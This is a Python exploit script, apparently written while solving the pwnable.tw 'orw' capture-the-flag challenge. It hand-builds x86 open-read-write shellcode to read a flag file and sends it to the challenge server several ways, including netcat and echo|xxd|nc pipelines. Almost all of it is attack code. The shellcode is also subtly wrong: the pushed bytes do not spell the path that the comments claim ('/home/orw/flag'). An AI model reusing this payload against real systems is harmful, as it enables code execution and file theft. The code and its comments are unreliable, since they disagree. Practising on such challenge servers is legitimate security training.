#!/usr/bin/env python3

# Ultimate attempt - try the most basic working ORW shellcode

import socket
import time
import subprocess

def create_ultimate_shellcode():
    # Most basic ORW shellcode using push method
    shellcode = b""
    
    # Clear eax and build string
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x50"                  # push eax (null)
    shellcode += b"\x68\x67\x61\x6c\x66"  # push "flag"
    shellcode += b"\x68\x2f\x72\x77\x2f"  # push "/orw/"
    shellcode += b"\x68\x2f\x68\x6f\x6d"  # push "/hom"
    
    # open("/home/orw/flag", O_RDONLY, 0)
    shellcode += b"\x89\xe3"              # mov ebx, esp
    shellcode += b"\x31\xc9"              # xor ecx, ecx
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb0\x05"              # mov al, 5
    shellcode += b"\xcd\x80"              # int 0x80
    
    # read(fd, buffer, 100)
    shellcode += b"\x89\xc3"              # mov ebx, eax
    shellcode += b"\x89\xe1"              # mov ecx, esp
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb2\x64"              # mov dl, 100
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x03"              # mov al, 3
    shellcode += b"\xcd\x80"              # int 0x80
    
    # write(1, buffer, bytes_read)
    shellcode += b"\x89\xc2"              # mov edx, eax
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x04"              # mov al, 4
    shellcode += b"\xb3\x01"              # mov bl, 1
    shellcode += b"\xcd\x80"              # int 0x80
    
    # exit(0)
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x40"                  # inc eax
    shellcode += b"\xcd\x80"              # int 0x80
    
    return shellcode

def ultimate_test():
    shellcode = create_ultimate_shellcode()
    print(f"Ultimate shellcode: {len(shellcode)} bytes")
    print(f"Hex: {shellcode.hex()}")
    
    # Write to file for netcat
    with open('/workspace/orw_challenge/ultimate.bin', 'wb') as f:
        f.write(shellcode)
    
    # Try multiple methods
    methods = [
        "python socket",
        "netcat with timeout",
        "netcat with sleep",
        "bash with timeout"
    ]
    
    for i, method in enumerate(methods):
        print(f"\n--- Method {i+1}: {method} ---")
        
        if method == "python socket":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(20)
                s.connect(("chall.pwnable.tw", 10001))
                
                data = s.recv(1024)
                print(f"Prompt: {data.decode()}")
                
                s.send(shellcode)
                time.sleep(5)
                
                response = s.recv(1024)
                if response:
                    print(f"Response: {response}")
                    if b"FLAG{" in response or b"orw{" in response:
                        print("FOUND FLAG!")
                        return response.decode()
                else:
                    print("No response")
                    
                s.close()
            except Exception as e:
                print(f"Error: {e}")
                
        elif method == "netcat with timeout":
            try:
                cmd = "timeout 10 bash -c 'cat /workspace/orw_challenge/ultimate.bin | nc chall.pwnable.tw 10001'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.stdout:
                    print(f"Output: {result.stdout}")
                    if "FLAG{" in result.stdout or "orw{" in result.stdout:
                        print("FOUND FLAG!")
                        return result.stdout
                if result.stderr:
                    print(f"Error: {result.stderr}")
            except Exception as e:
                print(f"Error: {e}")
                
        elif method == "netcat with sleep":
            try:
                cmd = "(cat /workspace/orw_challenge/ultimate.bin; sleep 5) | nc chall.pwnable.tw 10001"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                if result.stdout:
                    print(f"Output: {result.stdout}")
                    if "FLAG{" in result.stdout or "orw{" in result.stdout:
                        print("FOUND FLAG!")
                        return result.stdout
                if result.stderr:
                    print(f"Error: {result.stderr}")
            except Exception as e:
                print(f"Error: {e}")
                
        elif method == "bash with timeout":
            try:
                cmd = f"echo -ne '{shellcode.hex()}' | xxd -r -p | nc chall.pwnable.tw 10001"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                if result.stdout:
                    print(f"Output: {result.stdout}")
                    if "FLAG{" in result.stdout or "orw{" in result.stdout:
                        print("FOUND FLAG!")
                        return result.stdout
                if result.stderr:
                    print(f"Error: {result.stderr}")
            except Exception as e:
                print(f"Error: {e}")
    
    return None

if __name__ == "__main__":
    flag = ultimate_test()
    if flag:
        print(f"\n🎉 FLAG FOUND: {flag}")
    else:
        print("\n❌ No flag found with any method")